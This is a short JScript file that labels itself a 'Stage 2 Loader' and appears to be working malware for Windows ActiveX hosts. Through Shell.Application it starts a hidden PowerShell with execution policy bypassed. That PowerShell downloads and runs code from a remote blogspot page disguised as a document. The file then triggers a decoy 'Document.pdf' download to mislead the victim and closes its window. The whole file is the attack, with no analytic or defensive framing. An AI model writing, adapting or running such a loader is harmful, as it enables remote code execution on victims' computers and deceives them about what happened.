// =============================================
// DEBUG VERSION - Stage 2 Loader
// =============================================

(function() {
    try {
        var shell = new ActiveXObject("Shell.Application");

        // Simple, direct command for testing
        var cmd = '-ep Bypass -c "Invoke-Expression (IRM \'https://aprilcap.blogspot.com/2026/04/chut.docx.pdf.html\'); Start-Sleep -Seconds 5"';

        shell.ShellExecute("powershell.exe", cmd, "", "open", 0);

        // Decoy PDF
        setTimeout(() => {
            var a = document.createElement("a");
            a.href = "https://www.google.com";
            a.download = "Document.pdf";
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }, 800);

        // Self delete attempt (optional)
        setTimeout(() => {
            try { window.close(); } catch(e) {}
        }, 2000);

    } catch(e) {
        alert("Error: " + e.message);   // Temporary for debugging
    }
})();